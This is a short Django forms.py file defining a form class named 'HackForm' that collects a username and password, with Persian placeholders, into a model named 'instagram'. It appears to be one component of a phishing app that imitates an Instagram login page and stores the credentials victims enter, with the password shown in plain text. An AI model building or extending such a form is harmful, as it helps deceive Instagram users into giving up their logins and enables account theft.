from django import forms
from .models import instagram
class HackForm(forms.ModelForm):

    class Meta:
        model = instagram
        fields = ('username', 'password') 
        widgets = {
        'username': forms.TextInput(attrs={'placeholder': 'نام کاربری'}),
        'password': forms.TextInput(attrs={'placeholder': 'کلمه عبور'}),
        }